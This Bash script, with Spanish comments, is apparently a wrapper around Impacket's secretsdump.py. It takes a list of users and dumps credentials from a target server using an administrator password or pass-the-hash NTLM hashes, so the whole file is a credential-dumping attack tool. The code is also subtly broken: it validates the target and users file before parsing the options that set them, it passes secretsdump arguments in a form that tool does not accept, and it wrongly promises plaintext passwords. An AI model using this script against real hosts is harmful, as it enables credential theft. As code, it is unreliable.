#!/bin/bash

# Función de ayuda
usage() {
    echo "Uso: $0 -s <servidor> -u <usuario_admin> -p <password_admin> -f <usuarios_file> [-H <LMHASH:NTHASH>]"
    echo "  -s <servidor>          Dirección IP o nombre del servidor de destino"
    echo "  -u <usuario_admin>     Nombre de usuario con privilegios de administración"
    echo "  -p <password_admin>    Contraseña del usuario con privilegios de administración (opcional si usas hash)"
    echo "  -f <usuarios_file>     Archivo que contiene el listado de usuarios"
    echo "  -H <LMHASH:NTHASH>     Hash LM:NTHASH del usuario administrador (opcional)"
    echo ""
    echo "Ejemplos de uso:"
    echo "  1. Usar contraseña en texto plano:"
    echo "     $0 -s 192.168.1.10 -u admin -p admin123 -f usuarios.txt"
    echo ""
    echo "  2. Usar hashes NTLM/LM:"
    echo "     $0 -s 192.168.1.10 -u admin -f usuarios.txt -H 'LMHASH:NTHASH'"
    echo ""
    echo "  Nota: Asegúrate de reemplazar 'LMHASH' y 'NTHASH' con los valores reales de los hashes."
    exit 1
}

# Comprobamos que se pasen los parámetros correctos
if [ "$#" -lt 8 ]; then
    usage
fi

# Ruta por defecto para secretsdump.py en Kali Linux
SECRET_DUMP_PATH="/usr/share/doc/python3-impacket/examples/secretsdump.py"

# Comprobación de recursos necesarios

# 1. Verificar si Python 3 está instalado
if ! command -v python3 &> /dev/null; then
    echo "Error: Python 3 no está instalado. Por favor, instálalo para continuar."
    exit 1
fi

# 2. Verificar si Impacket está instalado
if ! python3 -c "import impacket" &> /dev/null; then
    echo "Error: Impacket no está instalado. Por favor, instálalo utilizando 'pip install impacket'."
    exit 1
fi

# 3. Comprobar si el archivo secretsdump.py existe en la ruta predeterminada
if [[ ! -f "$SECRET_DUMP_PATH" ]]; then
    echo "Error: No se encuentra el archivo secretsdump.py en la ruta predeterminada: $SECRET_DUMP_PATH"
    exit 1
fi

# 4. Verificar que el archivo de usuarios existe
if [[ ! -f "$USERS_FILE" ]]; then
    echo "Error: El archivo $USERS_FILE no existe. Por favor, revisa el nombre del archivo."
    exit 1
fi

# 5. Verificar la accesibilidad del servidor (ping)
if ! ping -c 1 "$TARGET_HOST" &> /dev/null; then
    echo "Error: No se puede alcanzar el servidor $TARGET_HOST. Verifica la conectividad de red."
    exit 1
fi

# Parseo de parámetros con flags
while getopts "s:u:p:f:H:" opt; do
  case $opt in
    s) TARGET_HOST="$OPTARG" ;;
    u) USERNAME="$OPTARG" ;;
    p) PASSWORD="$OPTARG" ;;
    f) USERS_FILE="$OPTARG" ;;
    H) HASHES="$OPTARG" ;;
    *) usage ;;
  esac
done

# Validar que todos los parámetros estén definidos
if [[ -z "$TARGET_HOST" || -z "$USERNAME" || -z "$USERS_FILE" ]]; then
  echo "El servidor, el usuario administrador y el archivo de usuarios son obligatorios."
  usage
fi

# Preparar el comando de autenticación
if [[ -n "$HASHES" ]]; then
    # Usar hashes en lugar de la contraseña
    AUTH_CMD="-hashes $HASHES"
elif [[ -n "$PASSWORD" ]]; then
    # Usar contraseña en texto plano
    AUTH_CMD="-user $USERNAME -password $PASSWORD"
else
    echo "Debes proporcionar una contraseña o un hash."
    usage
fi

# Recorrer el archivo de usuarios y hacer el volcado de contraseñas para cada uno
while IFS= read -r USER; do
  if [[ -n "$USER" ]]; then
    echo "Obteniendo contraseña en texto plano para el usuario: $USER"
    python3 "$SECRET_DUMP_PATH" $AUTH_CMD -target "$TARGET_HOST" "$USER"
    echo "--------------------------------------------------"
  fi
done < "$USERS_FILE"
